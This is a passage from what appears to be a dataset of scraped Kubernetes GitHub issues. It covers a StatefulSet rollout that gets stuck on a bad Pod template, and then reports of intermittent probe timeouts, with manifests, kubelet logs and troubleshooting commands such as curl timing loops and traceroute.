[this](https://github.com/kubernetes/kubernetes/issues/67250#issuecomment-460291862):\n\n>Rotten issues close after 30d of inactivity.\n>Reopen the issue with `/reopen`.\n>Mark the issue as fresh with `/remove-lifecycle rotten`.\n>\n>Send feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "mattmb", "body": "/reopen"}, {"author": "k8s-ci-robot", "body": "@mattmb: You can't reopen an issue/PR unless you authored it or you are a collaborator.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/67250#issuecomment-461437990):\n\n>/reopen\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "mattmb", "body": "Heh, well it was worth a go I suppose..."}, {"author": "MrTrustor", "body": "/reopen"}, {"author": "k8s-ci-robot", "body": "@MrTrustor: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/67250#issuecomment-461740082):\n\n>/reopen\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "huzhengchuan", "body": "+1  meet the same problem\r\nI think need to rollback success. but now it blocked"}, {"author": "dave-tock", "body": "+1. This is a pretty big landmine in using StatefulSet, if you ever make any mistake you're stuck with just destroying your StatefulSet and starting over. IOW, if you ever make a mistake with StatefulSet, you need to cause an outage to recover :("}, {"author": "krmayankk", "body": "/remove-lifecycle rotten "}, {"author": "enisoc", "body": "I apologize for letting this bug slip through the cracks, and for implying in [my earlier comment](https://github.com/kubernetes/kubernetes/issues/67250#issuecomment-414754525) that the current behavior is expected and acceptable. My intention was to report that I can confirm the bug exists and that it appears to be a design flaw rather than a regression.\r\n\r\nAs @MrTrustor noted in the original post, the workaround for this particular incarnation of the problem is to revert to a good Pod template, and then delete the stuck Pod. As a first step, I'll send a PR to the [StatefulSet docs](https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/) to warn about this pitfall and describe the workaround.\r\n\r\nThe larger, unsolved problem is what to do when StatefulSet encounters a situation in which it can't be confident that any action it takes is likely to make things better instead of worse. StatefulSet was designed to provide automation for a \"most-sensitive common denominator\" of stateful apps, so it very often chooses to stop and do nothing if anything isn't going perfectly according to plan.\r\n\r\nA [thread on Twitter](https://twitter.com/dave_universetf/status/1104973833088520193) discussing this bug resulted in a suggestion by @danderson for a feature to help mitigate these situations: provide an \"escape hatch\" to tell StatefulSet to proceed anyway, even if it detects something wrong. I think that's a good starting point for making progress on the general problem. Perhaps it could take the form of a field in the [RollingUpdate strategy](https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/#update-strategies) that applies all the time whenever it's set, or alternatively a one-time \"acknowledge and proceed\" signal that would tell StatefulSet to attempt to force-fix just one Pod but then revert to normal behavior after that.\r\n\r\nFor this specific incarnation of the general problem (a Pod that has never made it to Running state), we might be able to do something more automatic. Perhaps we can argue that it should always be safe to delete and replace such a Pod, as long as none of the containers (even init containers) ever ran. We'd also need to agree on whether this automatic fix-up can be enabled by default without being considered a breaking change, or whether it needs to be gated by a new field in StatefulSet that's off by default (until `apps/v2`).\r\n\r\nI'll start investigating some of these options and report back any findings. If anyone else has ideas or input, please leave them here."}, {"author": "andpol", "body": "To add a bit more information to this discussion, it's worth noting that the issue described in the original post is not present if you specify `podManagementPolicy: Parallel` in the StatefulSet spec. From what I can tell, this is because the value of `monotonic` is true in the code quoted [above](https://github.com/kubernetes/kubernetes/issues/67250#issuecomment-414754525). I guess this is somewhat implied by the policy name (rather calling it `ParallelReady` or something), and the StatefulSet docs do hint at this, but it was still a surprise to me when performing a rolling update. "}, {"author": "enisoc", "body": "@andpol Thanks, that's a good point. I made sure to mention it in my PR documenting this known issue: https://github.com/kubernetes/website/pull/13190"}, {"author": "janetkuo", "body": "This works as intended and is documented here:\r\n\r\nhttps://kubernetes.io/docs/tutorials/stateful-application/basic-stateful-set/#updating-statefulsets\r\n> The StatefulSet controller terminates each Pod, and **waits for it to transition to Running and Ready prior to updating the next Pod.** Note that, even though the StatefulSet controller will not proceed to update the next Pod until its ordinal successor is Running and Ready, it will restore any Pod that fails during the update to its current version. Pods that have already received the update will be restored to the updated version, and Pods that have not yet received the update will be restored to the previous version. In this way, the controller attempts to continue to keep the application healthy and the update consistent in the presence of intermittent failures.\r\n\r\nWhen designing StatefulSet (with OrderedReady policy) we expect any StatefulSet pods failure would require user intervention. But as discussed above we should provide users an escape hatch. "}, {"author": "danderson", "body": "I think we're talking about different things. The case I hit seemed to be a straightforward logic bug: if you create a StatefulSet with a broken template (in my case, resource requests such that all pods remain pending for ever), the sts controller will ignore any changes to the StatefulSet from there on. I applied a corrected template that could definitely schedule, deleted all pods... And the StatefulSet recreated them using the broken template, where they went pending again. I had to delete the entire StatefulSet and recreate it to get my template changes to apply.\r\n\r\nThat's what I meant when I spoke of overrides to @enisoc . While it's accepted that manual intervention will be needed sometimes (either by a human or a software operator), what I encountered was a situation where the StatefulSet ignored my interventions, and kept deploying broken pods. That was my complaint, not \"StatefulSet cannot guess what is safe or not for my arbitrary stateful workload\", that part definitely makes sense."}, {"author": "enisoc", "body": "@danderson Ah that's different. Can you give some more details to help me understand and reproduce the form of the bug you hit?\r\n\r\nI tried the following steps with k8s v1.12.1:\r\n\r\n1. I created a StatefulSet apps/v1 with a memory request of `100Gi`.\r\n2. StatefulSet created pod-0 which was stuck Pending due to resource request.\r\n3. I edited the StatefulSet to remove the memory request from the Pod template.\r\n4. StatefulSet did nothing. This is the form of the bug we've discussed above.\r\n5. I deleted pod-0. StatefulSet recreated pod-0 without the memory request (using updated template), and then proceeded to create the rest of the Pods. This is the workaround discussed above.\r\n\r\nSince you said in your case \"all pods\" (implying more than one) were created but Pending, I suspected you may be using `podManagementPolicy: Parallel` so I tried the above steps with that setting:\r\n\r\n1. I created a StatefulSet apps/v1 with a memory request of `100Gi` and `podManagementPolicy: Parallel`.\r\n2. StatefulSet created pod-0, pod-1, pod-2 but all were stuck Pending due to resource requests.\r\n3. I edited the StatefulSet to remove the memory request from the Pod template.\r\n4. StatefulSet deleted the Pending pod-2 and recreated it with the new Pod template, which became Running and Ready. Then it did the same for pod-1, followed by pod-0. This is consistent with the [comment above](https://github.com/kubernetes/kubernetes/issues/67250#issuecomment-472988799) that this bug should not manifest when the podManagementPolicy is Parallel.\r\n\r\nDo you get different results? Or are there steps that I did differently?"}, {"author": "antonlisovenko", "body": "This is a real blocker for programmatic usage of Statefulsets (from the Operator for example). The real use case: the operator creates the statefulset with some memory/cpu limits which cannot be fulfilled. So 2 pods are running and the 3rd is staying Pending as it cannot be scheduled to the node as there no available resources. Trying to fix and change the specification to have smaller limits doesn't help - the statefulset specification is updated but all the pods stay unchanged forever as the 3rd pod is Pending. The only way is to delete the pod manually which contradicts the nature of operators totally"}, {"author": "enisoc", "body": "After some initial investigation, I believe the mitigation described above should be feasible:\r\n\r\n> For this specific incarnation of the general problem (a Pod that has never made it to Running state), we might be able to do something more automatic. Perhaps we can argue that it should always be safe to delete and replace such a Pod, as long as none of the containers (even init containers) ever ran. We'd also need to agree on whether this automatic fix-up can be enabled by default without being considered a breaking change, or whether it needs to be gated by a new field in StatefulSet that's off by default (until apps/v2).\r\n\r\nThe specific incarnation we're talking about is when all of the following are true:\r\n\r\n1. There's a Pod stuck Pending because it was created from a bad StatefulSet revision.\r\n2. Deleting that stuck Pod (i.e. the workaround discussed above) would result in the Pod being replaced at a different revision (meaning we have reason to expect a different result; we won't hot-loop).\r\n\r\nIn this situation, I think we can argue that it's safe for StatefulSet to delete the Pending Pod for you, as long as we can ensure the Pod has not started running before we get around to deleting it. The argument would be, if the Pod never ran, then the application should not be affected one way or another if we delete it. We could potentially use the new [ResourceVersion precondition on Delete](https://github.com/kubernetes/kubernetes/pull/74040) to give a high confidence level that the Pod never started running.\r\n\r\nThere is still a very slight chance that a container started running and had some effect on the application already but the kubelet has not updated the Pod status yet. However, I would argue that the chance of that is small enough that we should take the risk in order to prevent StatefulSet from getting stuck in this common situation.\r\n\r\nI probably won't have time to work on the code for this any time soon since I'm about to change jobs. However, I'm willing to commit to being a reviewer if anyone is available to work on this."}, {"author": "TopherGopher", "body": "@enisoc I'm going to try taking a whack at this"}, {"author": "draveness", "body": "This issue is similar to #78007"}, {"author": "dims", "body": "/sig architecture"}, {"author": "fejta-bot", "body": "Issues go stale after 90d of inactivity.\nMark the issue as fresh with `/remove-lifecycle stale`.\nStale issues rot after an additional 30d of inactivity and eventually close.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle stale"}, {"author": "zerkms", "body": "/remove-lifecycle stale"}, {"author": "dims", "body": "@alejandrox1 @krmayankk Do you want to deal with this in the tech debt work group? PTAL"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 89898, "issue_url": "https://github.com/kubernetes/kubernetes/issues/89898", "issue_title": "Sometime Liveness/Readiness Probes fail because of net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)", "issue_author": "yuripastushenko", "issue_body": "**What happened**:\r\nIn my cluster sometimes readiness the probes are failing. But the application works fine.\r\n```\r\nApr 06 18:15:14 kubenode** kubelet[34236]: I0406 18:15:14.056915   34236 prober.go:111] Readiness probe for \"default-nginx-daemonset-4g6b5_default(a3734646-77fd-11ea-ad94-509a4c9f2810):nginx\" failed (failure): Get http://172.18.123.127:80/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\r\n```\r\n\r\n**What you expected to happen**:\r\nSuccessful Readiness Probe.\r\n\r\n**How to reproduce it (as minimally and precisely as possible)**:\r\nWe have few clusters with different workloads.\r\nOnly in cluster with big number of short living pods we have this issue.\r\nBut not on all nodes.\r\nWe can't reproduce this error on other our clusters (that have same configuration but different workload).\r\nHow i found the issue?\r\nI deployed a daemonset:\r\n```\r\napiVersion: extensions/v1beta1\r\nkind: DaemonSet\r\nmetadata:\r\n  name: default-nginx-daemonset\r\n  namespace: default\r\n  labels:\r\n    k8s-app: default-nginx\r\nspec:\r\n  selector:\r\n    matchLabels:\r\n      name: default-nginx\r\n  template:\r\n    metadata:\r\n      labels:\r\n        name: default-nginx\r\n    spec:\r\n      tolerations:\r\n      - operator: Exists\r\n      containers:\r\n      - name: nginx\r\n        image: nginx:latest\r\n        resources:\r\n          limits:\r\n            cpu: \"1\"\r\n            memory: \"1Gi\"\r\n          requests:\r\n            cpu: \"1\"\r\n            memory: \"1Gi\"\r\n        readinessProbe:\r\n          httpGet:\r\n            path: /\r\n            port: 80\r\n```\r\nThen i started to listen events on all pods of this daemonset.\r\nAfter a couple of time i received next events:\r\n```\r\nWarning  Unhealthy  110s (x5 over 44m)  kubelet, kubenode20  Readiness probe failed: Get http://172.18.122.143:80/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\r\nWarning  Unhealthy  11m (x3 over 32m)  kubelet, kubenode10  Readiness probe failed: Get http://172.18.65.57:80/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\r\n....\r\n```\r\nThose events where on ~50% of pods of this daemonset.\r\n\r\nOn the nodes where the pods with failed probes was placed, I collected the logs of kubelet.\r\nAnd there was errors like:\r\n```\r\nApr 06 14:08:35 kubenode20 kubelet[10653]: I0406 14:08:35.464223   10653 prober.go:111] Readiness probe for \"default-nginx-daemonset-nkwkf_default(90a3883b-77f3-11ea-ad94-509a4c9f2810):nginx\" failed (failure): Get http://172.18.122.143:80/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\r\n```\r\n\r\nI was thinking that sometimes the nginx in pod really response slowly.\r\nFor excluding this theory, I created a short script that curl the application in pod and store response time in a file:\r\n```\r\nwhile true; do curl http://172.18.122.143:80/ -s -o /dev/null -w  \"%{time_starttransfer}\\n\" >> /tmp/measurment.txt; done;\r\n```\r\n\r\nI run this script on node where the pod is placed for 30 minutes and i get the following:\r\n```\r\n$ cat /tmp/measurment.txt | sort -u\r\n0.000\r\n0.001\r\n0.002\r\n0.003\r\n0.004\r\n0.005\r\n0.006\r\n0.007\r\n\r\n$ cat /tmp/measurment.txt | wc -l\r\n482670\r\n```\r\nThere was `482670` measurements and the longest response time was `0.007`.\r\n\r\nIn logs of pod there are only message with response code 200 (from my requests and requests of readiness probes):\r\n```\r\n[06/Apr/2020:14:06:30 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"kube-probe/1.12\" \"-\"\r\n......\r\n[06/Apr/2020:14:08:35 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"curl/7.47.0\" \"-\"\r\n[06/Apr/2020:14:08:35 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"curl/7.47.0\" \"-\"\r\n[06/Apr/2020:14:08:35 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"curl/7.47.0\" \"-\"\r\n......\r\n[06/Apr/2020:14:08:41 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"kube-probe/1.12\" \"-\"\r\n```\r\nIt means that part of probes are successful.\r\n\r\nThen i stopped the curl script (because the big number of logs).\r\nI waited while new error with failed probe appears in kubelet logs.\r\n```\r\nApr 06 18:15:14 kubenode13 kubelet[34236]: I0406 18:15:14.056915   34236 prober.go:111] Readiness probe for \"default-nginx-daemonset-4g6b5_default(a3734646-77fd-11ea-ad94-509a4c9f2810):nginx\" failed (failure): Get http://172.18.123.127:80/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\r\n```\r\n\r\nAnd in logs of that pod with nginx I didn't find the request generated by this probe:\r\n```\r\nkubectl logs default-nginx-daemonset-4g6b5 | grep \"15:15\"\r\n[06/Apr/2020:18:15:00 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"kube-probe/1.12\" \"-\"\r\n[06/Apr/2020:18:15:20 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"kube-probe/1.12\" \"-\"\r\n[06/Apr/2020:18:15:30 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"kube-probe/1.12\" \"-\"\r\n[06/Apr/2020:18:15:40 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"kube-probe/1.12\" \"-\"\r\n[06/Apr/2020:18:15:50 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"kube-probe/1.12\" \"-\"\r\n``` \r\n\r\nIf I restart the kubelet - the error don't disappear.\r\nHave someone any suggestions about this?\r\n\r\n**Environment**:\r\n- Kubernetes version: **1.12.1**\r\n- Cloud provider or hardware configuration: ***hardware*\r\n- OS (e.g: `cat /etc/os-release`): ubuntu 16.04\r\n- Kernel (e.g. `uname -a`): 4.15.0-66-generic\r\n- Install tools:\r\n- Network plugin and version (if this is a network-related bug): calico:v3.1.3\r\n\r\nSeems like the problem appears in many different installations - https://github.com/kubernetes/kubernetes/issues/51096\r\n\r\n/sig network", "issue_labels": ["kind/bug", "sig/network", "area/kubelet", "sig/node", "triage/accepted"], "comments": [{"author": "yuripastushenko", "body": "/sig network"}, {"author": "athenabot", "body": "/triage unresolved\n\nComment `/remove-triage unresolved` when the issue is assessed and confirmed.\n\n\ud83e\udd16 I am a bot run by vllry. \ud83d\udc69\u200d\ud83d\udd2c"}, {"author": "Nittarab", "body": "Are you sure the application don't hit the resources limits? \r\n\r\nIn my case, the application starting fine, then the container start using more resources until he hit the limit. After that the readiness probes fail "}, {"author": "yuripastushenko", "body": "Yes, I am sure. I collected the metrics.\r\nCpu usage on pod was around 0.001\r\nRam - around 4mb.\r\nThis is a test application (pure nginx image) that did not do anything (no traffic is sent to it)."}, {"author": "yuripastushenko", "body": "/area kubelet"}, {"author": "manikanta-kondeti", "body": "any update on this? we have been facing similar issues since few weeks"}, {"author": "thockin", "body": "This is the first such report I have seen.  There's nothing obvious about why this would happen.\r\n\r\nIt's possible kubelet is too busy and starved for CPU and the probe happened to be thing that got thrashed.  How many pods are on this machine?  How busy is it?\r\n\r\nIt's possible the node itself is thrashing or something and OOM behavior is weird.  Does dmesg show any OOMs?\r\n\r\nIt's possible some other failure down deep in kubelet is being translated into this?  You could try running kubelet at a higher log level to get more details on what is happening.\r\n\r\nA lot of bugs have been fixed since 1.12, so we'd need to try to reproduce this and then try again in a more recent version.  Is there any way you can help boil down a simpler reproduction?"}, {"author": "athenabot", "body": "@thockin\nIf this issue has been triaged, please comment `/remove-triage unresolved`.\n\nIf you aren't able to handle this issue, consider unassigning yourself and/or adding the `help-wanted` label.\n\n\ud83e\udd16 I am a bot run by vllry. \ud83d\udc69\u200d\ud83d\udd2c"}, {"author": "manikanta-kondeti", "body": "@thockin  \r\n`returns-console-558995dd78-b6bjm                                  0/1     Running            0          23h`\r\n\r\nFor example, if you see the above get pods, `readiness probe` of one pod is failing almost every day. A restart would fix this. However, we're unable to find the root cause. But I don't see any abnormal numbers on CPU or memory or thread count. Doing a `describe pod` would give me that `readiness` has failed. How do we debug in such scenario? \r\n\r\nAlso, this is happening for this particular deployment only. The other pods are running fine.\r\n\r\n\"returns-console-558995dd78-pbjf8                                  1/1     Running            0          23h\r\nreturns-console-558995dd78-plqdr                                  1/1     Running            0          23h\r\nreturns-console-558995dd78-tlb5k                                  1/1     Running            0          23h\r\nreturns-console-558995dd78-tr2kd                                  1/1     Running            0          23h\r\nreturns-console-558995dd78-vfj2n                                  1/1     Running            0          23h\""}, {"author": "tarunwadhwa13", "body": "We too are facing the same issue in our cluster. \r\n\r\nKubernetes Version - 1.16.8\r\nKernel - 4.4.218-1\r\nOS - Centos 7\r\n\r\nInstalled using Kubespray\r\n\r\nIn our case, timeouts were not related to application but related to specific nodes in cluster. In our 13 node cluster, node 1 to 4 had some kind of issue wherein the pods running on these nodes had random failures due to timeouts. \r\n\r\nChecked that there weren't any cpu aur memory usage spikes also.\r\n\r\nP.S We are using NodePort for production use case. Is it possible that the node port setup cannot handle too many socket connections?"}, {"author": "thockin", "body": "I have no idea what might cause spurious probe failues.  @derekwaynecarr have you heard any other reports of this?\r\n\r\n@tarunwadhwa13 are you saying PROBES failed (always same node) or user traffic failed?  If you have any other information about what was going on with those nodes when the failures happen, it would help.  Check for OOMs, high CPU usage, conntrack failures?"}, {"author": "tarunwadhwa13", "body": "@thockin  Conntrack shows hardly 2 or 3 errors. Memory consumption is 60-65% per node.\r\n\r\nJust found that the timeouts were for almost all request and not just probe. We added istio lately to check connection stats and understand if the behaviour was due to application. But the findings were weird. Istio itself is now failing readiness probe quite frequently\r\n\r\n![image](https://user-images.githubusercontent.com/20948402/82115058-1c053c00-977e-11ea-828e-bde30286faed.png)\r\n\r\n157 failures in ~3 hours \r\n\r\nWould like to add that kubernetes is running in our Datacenter. And since iptables version is 1.4.21, --random-fully is not being implemented. But since all machines have same configuration, we ruled out this possibility"}, {"author": "casey-robertson", "body": "I apologize for not having a lot of details to share but I'd add my 2 cents.  We recently upgraded from Istio 1.4.4 to 1.5.4 and started seeing the issues described by OP.  Lots of liveness / readiness issues there were not happening before.  It SEEMS like adding let's say a 20sec initial delay had helped in most cases.  At this point we are still seeing it and not sure what the root cause is. \r\n\r\nrunning on EKS 1.15 (control plane) / 1.14 managed nodeGroups"}, {"author": "athenabot", "body": "@thockin\nIf this issue has been triaged, please comment `/remove-triage unresolved`.\n\nIf you aren't able to handle this issue, consider unassigning yourself and/or adding the `help-wanted` label.\n\n\ud83e\udd16 I am a bot run by vllry. \ud83d\udc69\u200d\ud83d\udd2c"}, {"author": "thockin", "body": "I'm afraid the only way to know more is to get something like a tcpdump from both inside and outside the pod, which captures one or more failing requests.\r\n\r\nPossible?"}, {"author": "den-is", "body": "I'm getting same issue.\r\nCouple Nginx+PHP Pods running on huge instances in parallel with couple other small applications. \r\nThese are staging apps+nodes without constant traffic.\r\nI constantly receive notification that these Nginx+PHP app has restarted... specifically Nginx container of these Pods.\r\nAt the same time other apps running in the same namespace, nodes never restart.\r\n```\r\nk -n staging get events\r\n...\r\n22m         Warning   Unhealthy                  pod/myapp-staging3-59f75b5d49-5tscw    Liveness probe failed: Get http://100.100.161.197:80/list/en/health/ping: net/http: request canceled (Client.Timeout exceeded while awaiting headers)\r\n23m         Warning   Unhealthy                  pod/myapp-staging4-7589945cc6-2nf4s    Liveness probe failed: Get http://100.100.161.198:80/list/en/health/ping: net/http: request canceled (Client.Timeout exceeded while awaiting headers)\r\n11m         Warning   Unhealthy                  pod/myapp-staging5-84fb4494db-5dvph    Liveness probe failed: Get http://100.104.124.220:80/list/en/health/ping: net/http: request canceled (Client.Timeout exceeded while awaiting headers)\r\n...\r\n```\r\n\r\nLiveness on an Nginx container looks like this:\r\n```yaml\r\n  liveness:\r\n    initialDelaySeconds: 10\r\n    periodSeconds: 10\r\n    failureThreshold: 3\r\n    httpGet:\r\n      path: /list/en/health/ping\r\n      port: 80\r\n```\r\nUPD: Strange thing is that completely distinct deployments you can see above staging4 staging5 stagingN - above 10 deployments fail at once.\r\n\r\nMy possible problem might be in missing `timeoutSeconds` which is default `1s`"}, {"author": "rudolfdobias", "body": "Having the same problem here. \r\n```yaml\r\nlivenessProbe:\r\n        httpGet:\r\n          path: /status\r\n          port: 80\r\n        initialDelaySeconds: 30\r\n        periodSeconds: 10\r\n        timeoutSeconds: 10\r\n        failureThreshold: 3\r\n```\r\n\r\nError cca 3 - 10 times a day:\r\n> Liveness probe failed: Get http://10.244.0.154:8002/status: net/http: request canceled (Client.Timeout exceeded while awaiting headers)\r\n\r\nThe service operates normally and responds to /status in 5ms, though.\r\n\r\n\u26a0\ufe0f  Also, and that is a bigger problem, at similar random times some pods refuse to connect to each other. \r\n\r\nRunning on Azure Kubernetes Service\r\nV 1.14.8"}, {"author": "arjun921", "body": "I'm facing the same issue as well, increasing timeoutSeconds didn't help.\r\n```yaml\r\n          livenessProbe:\r\n            httpGet:\r\n              path: /ping\r\n              port: http\r\n            failureThreshold: 5\r\n            initialDelaySeconds: 5\r\n            periodSeconds: 20\r\n            timeoutSeconds: 10\r\n          readinessProbe:\r\n            httpGet:\r\n              path: /ping\r\n              port: http\r\n            initialDelaySeconds: 5\r\n            periodSeconds: 20\r\n            timeoutSeconds: 10\r\n```\r\nRuning on Kubernetes v1.16.7 on AWS deployed via KOPS"}, {"author": "thockin", "body": "I appreciate the extra reports.  It sounds like something is really weird.  I'll repeat myself from above:\r\n\r\nI'm afraid the only way to know more is to get something like a tcpdump from both inside and outside the pod, which captures one or more failing requests.\r\n\r\nIs that possible?  Without that I am flying very blind.  I don't see this experimentally and I'm not flooded with reports of this, so it's going to be difficult to pin down.  If you say you see it repeatedly, please try to capture a pcap?"}, {"author": "arjun921", "body": "@thockin I'll try to get a dump if I'm able to replicate this issue consistently, since it tends to happen randomly.\r\nJust to clarify, what exactly did you mean by tcpdump outside the pod?\r\nDid you mean tcpdump of the node where the pod resides?\r\n\r\nSorry, I'm relatively new to this :sweat_smile: "}, {"author": "athenabot", "body": "@thockin\nIf this issue has been triaged, please comment `/remove-triage unresolved`.\n\nIf you aren't able to handle this issue, consider unassigning yourself and/or adding the `help-wanted` label.\n\n\ud83e\udd16 I am a bot run by vllry. \ud83d\udc69\u200d\ud83d\udd2c"}, {"author": "fscz", "body": "/remove-triage unresolved"}, {"author": "bigbitbus", "body": "We are also seeing this issue - trying to run a Django+WSGI+nginx server that works on a lower version of K8s, when we try this on Linode's managed Kubernetes service - LKE we see this\r\n\r\n```Events:\r\n  Type     Reason     Age    From                                Message\r\n  ----     ------     ----   ----                                -------\r\n  Normal   Scheduled  2m45s  default-scheduler                   Successfully assigned be/bigbitbus-stack-64c7b65b97-c2cth to lke6438-8072-5eecc7cc4d98\r\n  Normal   Pulled     2m45s  kubelet, lke6438-8072-5eecc7cc4d98  Container image \"##############/bigbitbus/bigbitbus-$$$$$$-server:###########\" already present on machine\r\n  Normal   Created    2m44s  kubelet, lke6438-8072-5eecc7cc4d98  Created container bbbchart\r\n  Normal   Started    2m44s  kubelet, lke6438-8072-5eecc7cc4d98  Started container bbbchart\r\n  Warning  Unhealthy  9s     kubelet, lke6438-8072-5eecc7cc4d98  Liveness probe failed: Get http://10.2.1.32:80/api/jindahoon/: net/http: request canceled (Client.Timeout exceeded while awaiting headers)\r\n```"}, {"author": "den-is", "body": "UPD: So since my last comment, I've updated timeouts to something more realistic. e.g.:\r\n```yaml\r\n  livenessProbe:\r\n    initialDelaySeconds: 30\r\n    periodSeconds: 10\r\n    timeoutSeconds: 5\r\n    failureThreshold: 3\r\n    successThreshold: 1\r\n    httpGet:\r\n      path: /health/ping\r\n      port: 80\r\n```\r\nEverything was quiet since then. But the day before yesterday, and yesterday: My prometheus-operator> alertmanger and slack have have exploded. And today by magic it is silent again not a single alert.\r\n\r\nMy apps is a usual PHP+Nginx pod. Staging environments deployed on 3 huge boxes. Just a dozen preview deploys which are deployed only once, and then opened by devs only once. No load at all.\r\nFor example, the app had 10 staging deploys. so app-staging1..10\r\nAnd all containers of exactly that one app were failing all at once. i repeat virtually not related deployments spread on 3 nodes.\r\nIn pod, only Nginx containers were restarting.\r\nIn logs, I was able to catch that actual Nginx was answering 499 to the liveness probe. Nothing else.\r\nStill investigating.\r\n\r\nWhile ~5 other PHP apps deploys on the same staging nodes never restart."}, {"author": "Siddharthk", "body": "I am also facing the same issue. Running on Kubernetes v1.16.8 on AWS EKS. Any workarounds?"}, {"author": "zaabskr", "body": "I am also facing the same issue with AKS 1.16.9. This is occuring consistently. Is there any way to investigate the issue?"}, {"author": "AndriiNeverov", "body": "@zaabskr \r\n\r\nLooks like this error message is a symptom of a more general problem of node-to-pod connectivity issues.\r\n\r\nIn our case, we confirmed that by using `traceroute` from the node to the pod's internal IP as suggested in https://discuss.kubernetes.io/t/who-where-actually-work-liveness-probe-in-kubernetes/4771/6. That IP was perfectly routable from the other pods and even from many other nodes, but not from that particular node it ended up on. The root cause turned out to be that the br-int (bridge) interface that connects the pod networks and the NSX overlay logical switch was failing to come up because of missing static routes. Fixing that magically solved the problem.\r\n\r\nIn other cases, the root cause may be different, but the first step would be to confirm whether the node can actually access that pod, e.g. ssh and traceroute or curl into the readiness probe (`curl -v http://172.70.3.3:15020/healthz/ready` when Istio sidecar containers fail to get ready), etc."}, {"author": "chasebolt", "body": "experiencing this issue in multiple GKE clusters. just started about 5 days ago. right now i'm having to drain the bad node and remove it from the pool. running `1.16.9-gke.6`"}, {"author": "colotiline", "body": "My issue was in a REST API dependency that was checked by readinessProbe. Doubles readinessTimeout helped."}, {"author": "23ewrdtf", "body": "**What happened**: After updating EKS from v1.14.9-eks-f459c0 to v1.15.11-eks-065dce some of our ReplicaSets and DaemonSets Liveness/Readiness probes started failing with `Liveness probe failed: Get http://xxx.xxx.xxx.xxx:80/: net/http: request canceled (Client.Timeout exceeded while awaiting headers` \r\n\r\nIt seems that random pods are affected. I can successfully curl to them from other pods.\r\n\r\nAll nodes and pods are fine, not CPU/Memory/Storage issues.\r\n\r\nTwo nodes are running 1.15 and the rest 1.14. There doesn't seem to be a correlation between node version and the issue.\r\n\r\nNothing obvious in `kubectl cluster-info dump` or `journalctl -r` or `kube-proxy.log`\r\n\r\nProbes are mostly configured like this (truncated):\r\n```\r\n    livenessProbe:\r\n      failureThreshold: 3\r\n      periodSeconds: 10\r\n      successThreshold: 1\r\n      timeoutSeconds: 1\r\n\r\n    readinessProbe:\r\n      failureThreshold: 3\r\n      periodSeconds: 10\r\n      successThreshold: 1\r\n      timeoutSeconds: 1\r\n```\r\n\r\nI will increase the timeouts but it would be good to solve this. What changed in 1.15?\r\n\r\n**What you expected to happen**: Liveness/Readiness probes not to fail.\r\n\r\n**How to reproduce it (as minimally and precisely as possible)**: Upgrade EKS 1.14 to 1.15\r\n\r\n**Environment**:\r\n- Kubernetes version (use `kubectl version`): \r\n```\r\nClient Version: version.Info{Major:\"1\", Minor:\"18\", GitVersion:\"v1.18.6\", GitCommit:\"dff82dc0de47299ab66c83c626e08b245ab19037\", GitTreeState:\"clean\", BuildDate:\"2020-07-16T00:04:31Z\", GoVersion:\"go1.14.4\", Compiler:\"gc\", Platform:\"darwin/amd64\"}\r\nServer Version: version.Info{Major:\"1\", Minor:\"15+\", GitVersion:\"v1.15.11-eks-065dce\", GitCommit:\"065dcecfcd2a91bd68a17ee0b5e895088430bd05\", GitTreeState:\"clean\", BuildDate:\"2020-07-16T01:44:47Z\", GoVersion:\"go1.12.17\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\n```\r\n\r\n- Cloud provider or hardware configuration: EKS\r\n- OS (e.g: `cat /etc/os-release`):\r\n1.14:\r\n```\r\nami-048d37e92ce89022e amazon-eks-node-1.14-v20200507\r\n$ uname -a\r\nLinux ip-xxxxxxx.xxxxxx.compute.internal 4.14.177-139.253.amzn2.x86_64 #1 SMP Wed Apr 29 09:56:20 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\r\n$ cat /etc/os-release\r\nNAME=\"Amazon Linux\"\r\nVERSION=\"2\"\r\nID=\"amzn\"\r\nID_LIKE=\"centos rhel fedora\"\r\nVERSION_ID=\"2\"\r\nPRETTY_NAME=\"Amazon Linux 